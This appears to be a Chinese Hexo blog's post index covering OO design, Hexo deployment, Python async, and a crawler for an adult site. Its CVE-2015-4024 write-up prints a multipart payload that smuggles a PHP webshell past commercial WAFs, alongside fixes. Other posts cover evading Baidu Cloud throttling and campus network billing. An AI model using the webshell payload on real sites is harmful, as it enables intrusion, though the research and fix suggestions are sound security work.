提高软件开发的效率 3. 提高软件质量：可维护性，可扩展性，可重用性等。 其中语言的发展，开发方法的发展在1,2两条上面取得了极大的进步，但对于第3条，我们不能光指望开发方法本身来解决。 提高软件质量：可维护性，可扩展性，可重用性等，再具体点，就是高内聚、低耦合，面向对象就是为了解决第3条的问题。因此要成为一个好的程序员，最绕不开的就是面向对象了。 二、 要想学好面向对象，就必须学习设计模式。 假定我们了解了面向对象的目的，概念了，但是我们coding过程中却发现，我们的面向对象的知识似乎一直派不上用场，其实道理很简单，是因为 我们不知道怎么去用，就像游泳一样，我们已经明白了游泳的好处，以及游泳的几种姿势，狗刨、仰泳、蛙泳、自由泳，但是我们依然不会游泳。。。。 因此有了这些基本原则是不行的，我们必须有一些更细的原则去指导我们的设计，这就有了更基础的面向对象的五大原则，而把这几种原则更详细的应用 到实际中来，解决实际的问题，这就是设计模式。因此要学好OO，必须要学习设计模式，学习设计模式，按大师的话说，就是在人类努力解决的许多领域的成功方 案都来源于各种模式，教育的一个重要目标就是把知识的模式一代一代传下去。 因此学习设计模式，就像我们在看世界顶级的游泳比赛，我们为之疯狂，为之着迷。 三、学习设计模式 正像我们并不想只是看别人表演，我们要自己学会游泳，这才是我们的目的所在。 当我们看完几篇设计模式后，我们为之精神振奋，在新的coding的时候，我们总是想努力的用上学到的设计模式，但是经常在误用模式，折腾半天发现是在脱裤子抓痒。。。 当学完设计模式之后，我们又很困惑，感觉这些模式简直太像了，很多时候我们分不清这些模式之间到底有什么区别，而且明白了设计过程中的一个致命 的东西——过度设计，因为设计模式要求我们高扩展性，高重用性，但是在需求提出之初，我们都不是神，除了依靠过去的经验来判断外，我们不知道哪些地方要扩 展，哪些地方要重用，而且过去的经验就一定是正确的吗？所以我们甚至不敢再轻易用设计模式，而是还一直在用面向过程的方法在实现需求。 四、学习重构 精彩的代码是怎么想出来的，比看到精彩的代码更加令人期待。于是我们开始思考，这些大师们莫非不用工作，需求来了没有领导规定完成时间，只以设 计精彩的代码为标准来开展工作？这样的工作太爽了，也不可能，老板不愿意啊。就算这些理想的条件他都有，他就一开始就设计出完美的代码来了？也不可能啊， 除非他是神，一开始就预料到未来的所有需求，那既然这些条件都没有，他们如何写出的精彩代码？ Joshua Kerievsky在那篇著名的《模式与XP》〔收录于《极限编程研究》一书）中明白地指出：在设计前期使用模式常常导致过度工程（over- engineering)。这是一个残酷的现实，单凭对完美的追求无法写出实用的代码，而「实用」是软件压倒一切的要素。 在《重构——改善既有的代码的设计》一书中提到，通过重构（refactoring），你可以找出改变的平衡点。你会发现所谓设计不再是一切动 作的前提，而是在整个开发过程中逐渐浮现出来。在系统构筑过程中，你可以学习如何强化设计；其间带来的互动可以让一个程序在开发过程中持续保有良好的设 计。 总结起来就是说，我们在设计前期就使用设计模式，往往导致设计过度，因此应该在整个开发过程，整个需求变更过程中不断的重构现在的代码，才能让 程序一直保持良好的设计。由此可见，开发过程中需要一直重构，否则无论当初设计多么的好，随着需求的改变，都会变成一堆烂代码，难以维护，难以扩展。所谓 重构是这样一个过程：「在不改变代码外在行为的前提下，对代码做出修改，以改进程序的内部结构」。重构的目标，就是设计模式，更本质的讲就是使程序的架构 更趋合理，从而提高软件的可维护性，可扩展性，可重用性。 《重构——改善既有的代码的设计》一书也是Martin Fowler等大师的作品，软件工程领域的超级经典巨著，与另一巨著《设计模式》并称”软工双雄”，不可不读啊。 五、开始通往优秀软件设计师的路上 通过设计模式和重构，我们的所学和我们工作的coding终于结合上了，我们可以在工作中用面向对象的思维去考虑问题，并开始学习重构了。这就 像游泳一样，我们看完了各种顶级的游泳比赛，明白各种规则，名人使用的方法和技巧，现在是时候回家去村旁边的小河里练练了。练习也是需要有教练的，推荐另 一本经典书叫《重构与模式》，引用他开篇的介绍，本书开创性地深入揭示了重构与模式这两种软件开发关键技术之间的联系，说明了通过重构实现模式改善既有的 设计，往往优于在新的设计早期使用模式。本书不仅展示了一种应用模式和重构的创新方法，而且有助于读者结合实战深入理解重构和模式。 这本书正是我们需要的教练，值得一读。 六、没有终点，只有坚持不懈的专研和努力。 经过了几年的坚持，终于学会了灵活的运用各种模式，我们不需要去刻意的想用什么模式，怎么重构。程序的目标，就是可维护性，可扩展性，可重用 性，都已经成了一种编程习惯，一种思维习惯，就像我们练习了几年游泳之后，我们不用再刻意的去考虑，如何让自己能在水上漂起来，仰泳和蛙泳的区 别….. 而是跳进水里，就自然的游了起来，朝对岸游去。但是要和大师比起来，嘿嘿，我们还有很长的路要走，最终也可能成不了大师，但无论能不能成为大师，我们已经 走在了成为大师的正确的路上，我们和别的程序员已经开始不一样，因为他们无论再过多少年，他们的水平不会变，只是在重复造轮子，唯一比你快的，就是 Ctrl+C和Ctrl+V。 正确的路上，只要坚持，就离目标越来越近，未来就一定会是一个优秀的架构师，和优秀架构师的区别，可能只是时间问题。 转自李凡的博客]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[hexo在github和coding.net部署并分流（一）]]></title>
      <url>%2F2017%2F01%2F10%2Fhexo%E5%9C%A8github%E5%92%8Ccoding-net%E9%83%A8%E7%BD%B2%E5%B9%B6%E5%88%86%E6%B5%81%EF%BC%88%E4%B8%80%EF%BC%89-1.html</url>
      <content type="text"><![CDATA[安装GIT和Node.JS首先在自己的电脑上安装好git和node.js，这一步怎么做自己搜索，安装软件都是下一步下一步，应该不难,GIT安装完成后打开git cmd输入12git config --global user.name "Your Name"git config --global user.email "email@example.com" 因为Git是分布式版本控制系统，所以，每个机器都必须自报家门：你的名字和Email地址。注意：git config命令的–global参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。 #安装并初始化HEXO如果你是在Windows上，请打开Git-CMD假如你是想在D:\blog\下建立你的博客，请先在D盘下新建文件夹blog在Git-CMD中输入npm install -g hexo-cli回车开始安装hexo安装完成后将git cmd工作目录切换至D:\blog\然后输入hexo init回车，或者直接在git cmd中输入hexo init d:\\blog如果你的d:\blog\下的目录形式是12345678.├── _config.yml // 网站的配置信息，你可以在此配置大部分的参数。├── package.json ├── scaffolds // 模板文件夹。当你新建文章时，Hexo会根据scaffold来建立文件。├── source // 存放用户资源的地方| ├── _drafts| └── _posts└── themes // 存放网站的主题。Hexo会根据主题来生成静态页面。 那么你的hexo安装并初始化完成然后输入hexo server启动本地demo，打开浏览器，查看http://localhost:4000/可以看到自己的博客 将之托管到github和coding上github项目创建1.注册github账号2.创建项目仓库进入github.com，然后点击右上角 + –&gt;new repository 3.在Repository name中填写Github账号名.github.io，点击Create repository，完成创建。 Coding项目创建1.注册Coding账号2.创建项目仓库 3.填写项目名称描述创建即可 配置SHH配置shh key是让本地git项目与远程的github建立联系1.检查是否已经有SSH Key，打开Git Bash，输入1cd ~/.ssh 2.如果没有.ssh这个目录，则生成一个新的SSH，输入1ssh-keygen -t rsa -C "your e-mail" 注意1: 此处的邮箱地址，你可以输入自己的邮箱地址；注意2: 此处的「-C」的是大写的「C」接下来几步都直接按回车键,然后系统会要你输入密码12Enter passphrase (empty for no passphrase):&lt;输入加密串&gt;Enter same passphrase again:&lt;再次输入加密串&gt; 这个密码会在你提交项目时使用，如果为空的话提交项目时则不用输入。这个设置是防止别人往你的项目里提交内容。个人建议为空比较方便注意：输入密码的时候没有*字样的，你直接输入就可以了。3.最后看到这样的界面，就成功设置ssh key了 添加 SSH Key 到 GitHub和Coding复制~/.ssh/id_rsa.pub中的内容~是个人文件夹，比如我的电脑上是C:\Users\Administrator.ssh\id_rsa.pub，将其中的文本复制进入github，点击头像–&gt;Setting–&gt;SSH and GPG keys,然后在右侧点击New SSH key，Title随便写，key中填写id_rsa.pub中复制的内容，然后Add SSH key就ok了进入Coding.net，点击头像–&gt;个人设置–&gt;SSH公钥，新增公钥，公钥名称随便，公钥内容是填写id_rsa.pub中复制的内容，有效期可以勾选永久，然后添加ok 测试SSH是否配置成功1.打开Git Bash，然后输入1ssh -T git@github.com 如配置了密码则要输入密码,输完按回车如果显示以下内容，则说明Github中的ssh配置成功。12Hi username! You've successfully authenticated, but GitHub does notprovide shell access. 2.再输入1ssh -T git@git.coding.net 如果显示以下则说明coding中的ssh配置成功1Hello username You've connected to Coding.net by SSH successfully! 创建Github Pages和Coding Pages 服务1.GitHub Pages分两种，一种是你的GitHub用户名建立的username.github.io这样的用户&amp;组织页（站），另一种是依附项目的pages。想建立个人博客是用的第一种，形如cnfeat.github.io这样的可访问的站，每个用户名下面只能建立一个。Coding Pages服务开启在官网说的很详细，不知道请百度2.打开D:\blog文件夹中的_config.yml文件，找到如下位置，填写1234567# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy:- type: git repo: github: git@github.com:yourname/yourname.github.io.git,master coding: git@git.coding.net:yourname/yourname.git,coding-pages 注： (1) 其中yourname替换成你的Github账户名;(2)注意在yml文件中，:后面都是要带空格的。 #部署完成在blog文件夹中空白处右击打开Git Bash输入12hexo cleanhexo d- g 此时，通过访问http://yourname.github.io和http://yourname.coding.me可以看到默认的Hexo首页面（与之前本地测试时一样）。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python异步爬虫的学习(一)]]></title>
      <url>%2F2016%2F12%2F11%2FPython%E5%BC%82%E6%AD%A5%E7%88%AC%E8%99%AB%E7%9A%84%E5%AD%A6%E4%B9%A0(%E4%B8%80).html</url>
      <content type="text"><![CDATA[本文主要从一下几个方面进行说明: 什么是异步(Asynchronous)编程 为什么要使用异步编程？ 如何利用Python实现异步 什么是异步编程文章开始前，先简单介绍下各种 IO 模型：最容易做的是阻塞 IO即读写数据时，需要等待操作完成，才能继续执行。进阶的做法就是用多线程来处理需要 IO 的部分，缺点是开销会有些大。 接着是非阻塞 IO即读写数据时，如果暂时不可读写，则立刻返回，而不等待。因为不知道什么时候是可读写的，所以轮询时可能会浪费 CPU 时间。 然后是 IO 复用即在读写数据前，先检查哪些描述符是可读写的，再去读写。select 和 poll 就是这样做的，它们会遍历所有被监视的描述符，查看是否满足，这个检查的过程是阻塞的。而 epoll、kqueue 和 /dev/poll 则做了些改进，事先注册需要检查哪些描述符的哪些事件，当状态发生变化时，内核会调用对应的回调函数，将这些描述符保存下来；下次获取可用的描述符时，直接返回这些发生变化的描述符即可。 再之后是信号驱动即描述符就绪时，内核发送 SIGIO 信号，再由信号处理程序去处理这些信号即可。不过信号处理的时机是从内核态返回用户态时，感觉也得把这些事件收集起来才好处理，有点像模拟 IO 复用了。 最后是异步 IO即读写数据时，只注册事件，内核完成读写后（读取的数据会复制到用户态），再调用事件处理函数。这整个过程都不会阻塞调用线程，不过实现它的操作系统比较少，Windows 上有比较成熟的 IOCP，Linux 上的 AIO 则有不少缺点。虽然真正的异步 IO 需要中间任何步骤都没有阻塞，这对于某些只是偶尔需要处理 IO 请求的情况确实有用（比如文本编辑器偶尔保存一下文件）；但对于服务器端编程的大多数情况而言，它的主线程就是用来处理 IO 请求的，如果在空闲时不阻塞在 IO 等待上，也没有别的事情能做，所以本文就不纠结这个异步是否名副其实了。 然后我们了解一下事件循环(Event Loop)Event Loop 是一个很重要的概念，指的是计算机系统的一种运行机制。 我们一般的单线程程序中，所有任务需要排队，前一个任务结束，才会执行后一个任务。如果前一个任务耗时很长，后一个任务就不得不一直等着。 如果排队是因为计算量大，CPU忙不过来，倒也算了，但是很多时候CPU是闲着的，因为IO设备（输入输出设备）很慢（比如Ajax操作从网络读取数据），不得不等着结果出来，再往下执行。 那么这时主线程完全可以不管IO设备，挂起处于等待中的任务，先运行排在后面的任务。等到IO设备返回了结果，再回过头，把挂起的任务继续执行下去。 于是，所有任务可以分成两种，一种是同步任务（synchronous），另一种是异步任务（asynchronous）。同步任务指的是，在主线程上排队执行的任务，只有前一个任务执行完毕，才能执行后一个任务；异步任务指的是，不进入主线程、而进入”任务队列”（task queue）的任务，只有”任务队列”通知主线程，某个异步任务可以执行了，该任务才会进入主线程执行。具体来说，异步执行的运行机制如下。（同步执行也是如此，因为它可以被视为没有异步任务的异步执行。） （1）所有同步任务都在主线程上执行，形成一个执行栈（execution context stack）。 （2）主线程之外，还存在一个&quot;任务队列&quot;（task queue）。只要异步任务有了运行结果，就在&quot;任务队列&quot;之中放置一个事件。 （3）一旦&quot;执行栈&quot;中的所有同步任务执行完毕，系统就会读取&quot;任务队列&quot;，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行。 （4）主线程不断重复上面的第三步。 下图就是主线程和任务队列的示意图。 只要主线程空了，就会去读取”任务队列”，这个过程会不断重复。 所谓异步是相对于同步（Synchronous）的概念来说的，之所以容易造成混乱，是因为刚开始接触这两个概念时容易把同步看做是同时，而同时不是意味着并行（Parallel）吗？然而实际上同步或者异步是针对于时间轴的概念，同步意味着顺序、统一的时间轴，而异步则意味着乱序、效率优先的时间轴。比如在爬虫运行时，先抓取 A 页面，然后从中提取下一层页面 B 的链接，此时的爬虫程序的运行只能是同步的，B 页面只能等到 A 页面处理完成之后才能抓取；然而对于独立的两个页面 A1 和 A2，在处理 A1 网络请求的时间里，与其让 CPU 空闲而 A2 等在后面，不如先处理 A2，等到谁先完成网络请求谁就先来进行处理，这样可以更加充分地利用 CPU，但是 A1 和 A2 的执行顺序则是不确定的，也就是异步的。 为什么要使用异步编程？CPU的速度远远快于磁盘、网络等IO。在一个线程中，CPU执行代码的速度极快，然而，一旦遇到IO操作，如读写文件、发送网络数据时，就需要等待IO操作完成，才能继续进行下一步操作。这种情况称为同步IO。 在IO操作的过程中，当前线程被挂起，而其他需要CPU执行的代码就无法被当前线程执行了。 因为一个IO操作就阻塞了当前线程，导致其他代码无法执行，所以我们必须使用多线程或者多进程来并发执行代码，为多个用户服务。每个用户都会分配一个线程，如果遇到IO导致线程被挂起，其他用户的线程不受影响。 多线程和多进程的模型虽然解决了并发问题，但是系统不能无上限地增加线程。由于系统切换线程的开销也很大，所以，一旦线程数量过多，CPU的时间就花在线程切换上了，真正运行代码的时间就少了，结果导致性能严重下降。 由于我们要解决的问题是CPU高速执行能力和IO设备的龟速严重不匹配，多线程和多进程只是解决这一问题的一种方法。 另一种解决IO问题的方法是异步IO。当代码需要执行一个耗时的IO操作时，它只发出IO指令，并不等待IO结果，然后就去执行其他代码了。一段时间后，当IO返回结果时，再通知CPU进行处理。 如何利用Python实现异步我们首先需要了解以下几个概念： Event Loop Coroutine 其中Event Loop在前面已经解释过Coroutine是协程，具体解释可以查阅协程 Python 3.5 以后推荐使用 async/await 关键词来定义协程，它具有如下特性： 通过 await 将可能阻塞的行为挂起，直到有结果之后继续执行，Event loop 也是据此来对多个协程的执行进行调度的； 协程并不像一般的函数一样，通过 coro() 进行调用并不会执行它，而只有将它放入 Event loop 进行调度才能执行。 这里我就从廖大哪里搬运个小例子(有改动)123456789101112import threadingimport asyncioasync def hello(): print('Hello world! (%s)' % threading.currentThread()) await asyncio.sleep(1) print('Hello again! (%s)' % threading.currentThread())loop = asyncio.get_event_loop()tasks = [hello(), hello()]loop.run_until_complete(asyncio.wait(tasks))loop.close() 执行结果 12345Hello world! (&lt;_MainThread(MainThread, started 140735195337472)&gt;)Hello world! (&lt;_MainThread(MainThread, started 140735195337472)&gt;)(暂停约1秒)Hello again! (&lt;_MainThread(MainThread, started 140735195337472)&gt;)Hello again! (&lt;_MainThread(MainThread, started 140735195337472)&gt;) 其中sleep是我们模拟的io用时，我么你可以从这个小例子中看出，执行hello()的时候，io并未堵塞，而是继续向下执行hello()会首先打印出Hello world!，然后，由于asyncio.sleep()是一个coroutine，所以线程不会等待asyncio.sleep()，而是直接中断并执行下一个消息循环。当asyncio.sleep()完成时，线程就可以接着执行下一行语句。 下一篇文章将在此基础上实现一个简洁、普适的爬虫框架]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[javbus爬虫-老司机你值得拥有]]></title>
      <url>%2F2016%2F12%2F06%2Fjavbus%E7%88%AC%E8%99%AB-%E8%80%81%E5%8F%B8%E6%9C%BA%E4%BD%A0%E5%80%BC%E5%BE%97%E6%8B%A5%E6%9C%89.html</url>
      <content type="text"><![CDATA[起因 有个朋友叫我帮忙写个爬虫，爬取javbus5上面所有的详情页链接，也就是所有的https://www.javbus5.com/SRS-055这种链接，我一看，嘿呀，这是司机的活儿啊，我绝对不能辱没我老司机的名声（被败坏了可不好），于是开始着手写了 构思 爬虫调度启动程序crawler.py 页面下载程序downloader.py 页面解析程序pageparser.py 数据库入库与去重管理程序controler.py 爬取入口为第一页，当页面中存在下一页的超链接继续往下爬，这是个死循环，跳出条件为没有了下一页的链接 在某一页中解析页面，返回所有的详情页链接，利用迭代器返回，然后在主程序中调用解析程序对页面信息进行解析并包装成字典返回，其中用详情页网址作为数据库主键，其他信息依次写入数据库 当这一页所有的子链接爬取完成后，继续爬取下一页。 将数据存入数据库，用的是sqllite3,失败的网址页存入一个fail_url.txt。 对于增量爬取，我是这么做的，当爬取到相同的网址时结束程序，这么做也有漏洞，才疏学浅，我没想到太好的办法，希望有好办法的给我说一声（布隆过滤正在研究之中），如果用数据库查询去重，那么势必导致二次爬取，我们都知道，爬虫更多的时间是花在网络等待上 问题 在写爬虫的过程中遇到了一些问题 在墙内爬不动，爬取几个之后就失败，这个解决方案只需要全局翻墙爬取就可以了 本来之前加了多线程并发爬取，但是发现爬取一段时间后会封ip导致整体无法运行，本来想搞个代理池进行并发，结果网上免费的代理太慢太慢，根本打不开网页，于是就改回了单线程 就是我的那个不完善的增量爬取，导致了你一次爬取就需要爬取完成，不然数据库里面存在你之前爬到的，爬取到你已有的会直接停止 存在反扒策略详情页中的磁力链接是ajax动态加载的，通过分析抓包，可以在XHR中找到是一个get请求，至于参数，我开始不知道怎么得来的，后来在html代码中找到了，我放几张图大家就明白了 我们通过对响应内容的查看可以发现磁力的加载访问了类似于这样一个网址 1https://www.javbus5.com/ajax/uncledatoolsbyajax.php?gid=30100637207&amp;lang=zh&amp;img=https://pics.javbus.info/cover/59pc_b.jpg&amp;uc=0&amp;floor=921 那么这些get参数是从哪里来呢，这就是通过经验与基本功去发现了 通过对html源文件的搜索，我们即可直接发现答案通过分析发现，后面的floor是个随机数参数，一般这种参数可以去除无影响，事实也是这样 我利用HttpRequest模拟发包，对这个请求直接get，发现所有数据隐藏 那么肯定是有反扒的策略，伪造请求头，反扒也就那么几种，通过分析发现是同源策略，对Referer请求头伪造成来源网址就可以直接获取到内容了 常见的Python2.x编码问题,全部转换为unicode字节流就可以了 这个问题在我博客中已经记录了http://www.53xiaoshuo.com/Python/77.html 有兴趣的童鞋可以看看 遇到的最闹心问题是详情页的项目抓取，有的详情页的类别不同，我开始只分析了一个页面，导致写的规则在有的页面上频频出错导致后面对抓取规则进行了大改,重写了分析规则，用了个笨办法，毕竟那小块的html写的十分不规范，正则规则有三种，挺烦人比如上图的两个就不同，html代码更是稀烂，需要判断有没有这个项，没有就设置空字节入库 在这其中纠结了一个问题 就是对于这两种的比较，我想上面这种变成下面这种，毕竟第一种的话，soup.find要执行两次，但是下面这种又要比上面那个多一行，丑一点最后我选择了第二种，所有的信息分析代码就不贴了，具体想看的直接看我的代码文件就好了 小Tips 对于动态加载的内容的爬取，能不用selenium去模拟浏览器爬取就不用，耗费资源，更好的是自己分析网络请求，然后构造 对于页面信息的解析，要多看几个页面，看是否相同，别到时候做多事情 多看别人的博客学习思路 注意 爬虫依赖的第三方库有Requests，BeautifulSoup，使用前请先pip install这两个第三方库 测试展与地址 代码地址: coding.net javbus_crawler github.com javbus_crawler 司机的名声总算是没有辱没，秋名山依旧，嘿嘿 转载请注明来源作者 博客：53xiaoshuo.com | hacktech.cn 作者：Akkuman]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[突破百度云限速与网页限制批量下载]]></title>
      <url>%2F2016%2F12%2F06%2F%E7%AA%81%E7%A0%B4%E7%99%BE%E5%BA%A6%E4%BA%91%E9%99%90%E9%80%9F%E4%B8%8E%E7%BD%91%E9%A1%B5%E9%99%90%E5%88%B6%E6%89%B9%E9%87%8F%E4%B8%8B%E8%BD%BD.html</url>
      <content type="text"><![CDATA[百度云限速比较坑，现在基本200k左右很多人都知道了，但是总有朋友问我，我说明一下 首先下载IDM(最好支持正版)下载链接：百度云shaoit 开始下载：一般的话，小文件直接打开浏览器就可以下载 大文件下载：首先在chrome浏览器中装上一个User-Agent Switcher for (Google)Chrome插件,然后选择安卓手机，也就是打开这个的手机页面，然后直接用IDM下载 批量下载与外链获取使用这个脚本，具体看链接内介绍 https://greasyfork.org/zh-CN/scripts/23635-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B 如何安装用户脚本 Firefox 及相关的浏览器：Greasemonkey。 Google Chrome、Chromium 及相关的浏览器：Tampermonkey。 Opera (版本 15 及更晚)：Tampermonkey 或者 Violentmonkey。 Opera 版本 12 及更早原生支持用户脚本。但 Violentmonkey 能提供更友好的界面和更好的兼容性。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ProgrammingError: You must not use 8-bit bytestrings...]]></title>
      <url>%2F2016%2F12%2F06%2FProgrammingError-You-must-not-use-8-bit-bytestrings.html</url>
      <content type="text"><![CDATA[问题出现：You must not use 8-bit bytestrings unless you use a text_factory that can interpret 8-bit bytestrings (like text_factory = str). It is highly recommended that you instead just switch your application to Unicode strings. 产生原因：问题在用Python的sqlite3操作数据库要插入的字符串中含有非ascii字符时产生，做插入的时候就报当前这个错误。 解决方法：1. 按提示12connection = sqlite3.connect(...)connection.text_factory = str 但是如果字符中出现非ascii字符，那么依然不能解决问题，会产生不可预知的乱码，这样可以参考 2 2. 以utf8的编码格式进行解码转为unicode编码做插入1234cursor.execute(''' INSERT INTO JAVBUS_DATA (姓名, 年龄) VALUES (?, ?) ''', ('张三'.decode('utf-8'), '22岁'.decode('utf-8'))) 但是如果数据太长，这样一个一个敲挺麻烦的，下面是一个使用map函数简化的小例子 1234567891011121314151617181920212223#-*-coding:utf-8-*-import sqlite3def decode_utf8(aStr): return aStr.decode('utf-8')conn = sqlite3.connect("something.db")cursor = conn.cursor()cursor.execute(''' CREATE TABLE IF NOT EXISTS JAVBUS_DATA( id INT PRIMARY KEY, 姓名 TEXT, 年龄 TEXT);''')print "Table created successfully"cursor.execute(''' INSERT INTO JAVBUS_DATA (姓名, 年龄) VALUES (?, ?) ''', map(decode_utf8, ('张三', '22岁')))cursor.close()conn.commit()conn.close() 其他注意：有时用第二种方法会出现UnicodeDecodeError加入#--coding:utf-8--还是不行请sys指定编码：123import sys reload(sys) sys.setdefaultencoding('utf8') 这个问题在python3应该不会出现，python2编码问题，仅作记录]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[WAF攻防研究之四个层次Bypass WAF]]></title>
      <url>%2F2016%2F09%2F25%2FWAF%E6%94%BB%E9%98%B2%E7%A0%94%E7%A9%B6%E4%B9%8B%E5%9B%9B%E4%B8%AA%E5%B1%82%E6%AC%A1Bypass-WAF.html</url>
      <content type="text"><![CDATA[绝对值得一看的技术文章pdf下载链接 [via@破-见 ]]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[PHP DOS漏洞的新利用：CVE-2015-4024 Reviewed]]></title>
      <url>%2F2016%2F09%2F24%2FPHP-DOS%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%96%B0%E5%88%A9%E7%94%A8%EF%BC%9ACVE-2015-4024-Reviewed.html</url>
      <content type="text"><![CDATA[1. 背景介绍今天我们想从2015.04.03的一个PHP远程dos漏洞（CVE-2015-4024）说起。技术细节见如下链接，https://bugs.php.net/bug.php?id=69364。因为php解析body part的header时进行字符串拼接，而拼接过程重复拷贝字符导致DOS。事实上该漏洞还有其他非dos的利用价值，其中之一，就是绕过当前各种云WAF的文件上传防御策略。 目前国内外流行的云WAF厂商有如百度云加速，360网站卫士，加速乐，云盾等。因为PHP远程dos漏洞及PHP官方修复方案的特点，我们成功利用该漏洞绕过了当前主流WAF的文件上传防御，例如百度云加速、360网站卫士、知道创于加速乐、安全狗。 接下来，我们以PHP为例，详细解析我们的绕过方法。 2. 绕过WAF的原理根据PHP DOS漏洞原理，在multipart_buffer_headers函数解析header对应value时，value值存在n行。每行的字符串以空白符开头或不存字符’:’，都触发以下合并value的代码块。那么解析header的value就要执行(n-1)次合并value的代码块，从而导致DOS。 123456789101112131415prev_len= strlen(prev_entry.value);cur_len= strlen(line);entry.value= emalloc(prev_len + cur_len + 1); //1次分片内存memcpy(entry.value,prev_entry.value, prev_len); //1次拷贝memcpy(entry.value+ prev_len, line, cur_len); //1次拷贝entry.value[cur_len+ prev_len] = '\0';entry.key= estrdup(prev_entry.key);zend_llist_remove_tail(header);//1次内存释放 而PHP官方修复方案，在进行合并时，避免重复拷贝，从而避免DOS。绕过WAF的关键在于，PHP multipart_buffer_headers函数解析header对应value时，value值存在多行。每行的字符串以空白符开头或不存字符’:’，将进行合并。而WAF在解析文件上传的文件名时，没有考虑协议兼容，不进行多行合并，就可以被绕过。 根据原理构造绕过WAF文件上传防御的payload，WAF解析到的文件名为”test3.jpg”，而PHP解析到的文件名是”test3.jpg\nf/shell.php”，因为”/”是目录分隔符，上传的文件名变为shell.php。以下是绕过paylaod、测试脚本、paylaod进行文件上传的效果图。 WAF绕过payload:123456789------WebKitFormBoundaryx7V4AhipWn8ig52yContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test3.jpg\nsf/shell.phpContent-Type: application/octet-stream&lt;?php eval($_GET[&apos;c&apos;])?&gt;------WebKitFormBoundaryx7V4AhipWn8ig52y 文件上传功能测试脚本：1234567891011121314151617&lt;?php $name = $_FILES['file']['name']; echo $name; echo "\n"; move_uploaded_file($_FILES['file']['tmp_name'] , '/usr/local/nginx/html/upload/'.$_FILES['file']['name']); echo "upload success! ".$_FILES['file']['name']; echo "\n"; echo strlen($_FILES['file']['name']);?&gt; Payload能够正常上传 3. 绕过WAF实战笔者通过搭建自己的测试站，接入360网站卫士和加速乐，验证绕过WAF文件上传防御的方法。 3.1 绕过360网站卫士步骤1，验证网站已被360网站卫士防御，拦截了直接上传PHP文件的请求。 步骤2：成功绕过360网站卫士，上传shell成功，文件是apo.php。在该请求中，有没有Content-Type不影响绕过。 3.2 绕过知道创宇加速乐步骤一：验证网站被加速乐保护，拦截了直接上传PHP文件的请求。 步骤二：成功绕过加速乐，上传shell，文件是syt.php。 3.3. 绕过百度云加速百度云加速与CloudFlare，从百度匀加速拦截页面可以看出使用的是CloudFlare. 但是估计有本地化，百度云加速应该是百度和CloudFlare共同产物吧。测试百度没有搭建自己的测试环境，找了个接入了百度云加速的站进行测试。 步骤一：验证网站被百度云加速保护，拦截了直接上传PHP文件的请求。 步骤二：成功绕过云加速同上 4. 扩展—更多的工作4.1 分析filename其他字符的绕过同理，我们发现除了双引号外，使用单引号也能绕过WAF的防御，并实现文件上传。 123456789------WebKitFormBoundaryx7V4AhipWn8ig52yContent-Disposition: form-data; name=&quot;file&quot;; filename=&apos;test3.jpg\nsf/shell.phpContent-Type: application/octet-stream&lt;?php eval($_GET[&apos;c&apos;])?&gt;------WebKitFormBoundaryx7V4AhipWn8ig52y 4.2 分析其他应用脚本语言我们也发现jsp解析也有自己的特点，同时可被用于绕过WAF。暂时未测试asp,aspx,python等常用的WEB应用脚本语言。 5. 修复方案5.1 修复方案一解析文件上传请求时，如果发现请求不符合协议规范，则拒绝请求。可能会产生误拦截，需要评估误拦截的影响范围。 5.2 修复方案二兼容php的文件解析方式，解析文件名时，以单引号或双引号开头，并且对应的单引号双引号闭合。 6. 总结本文通过Review PHP远程dos漏洞(CVE-2015-4024)，并利用该特性绕过现有WAF的文件上传防御，成功上传shell。 更重要的价值，提供给我们一个绕过WAF的新思路，一种研究新方向：利用后端应用脚本与WAF行为的差异绕过WAF的防御。总的来说，一款优秀的WAF应该能够处理兼容WEB应用容器、标准协议、web服务器这间的差异。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[基于Openwrt+Shadowsocks+ipv6实现校园网免流量无限时长上网]]></title>
      <url>%2F2016%2F09%2F24%2F%E5%9F%BA%E4%BA%8EOpenwrt-Shadowsocks-ipv6%E5%AE%9E%E7%8E%B0%E6%A0%A1%E5%9B%AD%E7%BD%91%E5%85%8D%E6%B5%81%E9%87%8F%E6%97%A0%E9%99%90%E6%97%B6%E9%95%BF%E4%B8%8A%E7%BD%91.html</url>
      <content type="text"><![CDATA[转载自Dyhube 简述笔者利用笔记本电脑实现ipv6免费上网已经有一段时间了，原理是通过ipv6访问ipv4资源，在学校网络不限流量、不限时长、20兆带宽（我们学校ipv6限速上下对等20兆，没办法！）,电脑开热点全寝室共用，那真是爽翻天 ! 但是每天回到寝室总是打开电脑开热点还真是蛋疼的事情。再说电脑也不能总是开着吧。这时我就想能不能找个路由器，一天二十四小时开机，电脑、手机、平板随时都可以连。这个想法大概出现在半年前，由于手里没有路由器，就一直没弄，但是网上是有各种成功的案例的。 前段时间手里终于进了台K1，由于之前已经查了相当多的教程，所以就顺风顺水，很快就成功了。下面我就主要讲一下openwrt客户端的配置问题。 意义在大部分高校，ipv4一般是计流量或计时收费的，（笔者学校就是计时收费的，50元200小时网通十兆带宽）而且，由于校园的特殊性，相应的价格也比市面上宽带服务商要高。万幸的是，这些高校一般具有ipv6网络环境，并且由于国家的大力支持，普及范围广，而且不计算流量，聪明的人早就想能不能通过利用ipv6已达到免流量及无限时长上网？答案是可行的，鉴于目前公网的环境普遍是ipv4，我们可以找一台同时具有ipv4和ipv6地址的服务器，我们在校内通过ipv6访问服务器，然后服务器处理我们的访问请求以ipv4/ipv6双栈的方式代替我们访问互联网，再将数据通过ipv6反馈给我们，从而到达免流上网的目的。并且，考虑到大部分高校ipv6没有限制速度，理论上可以达到服务器出口的带宽，当然，具体取决于你们学校的ipv6出口带宽。 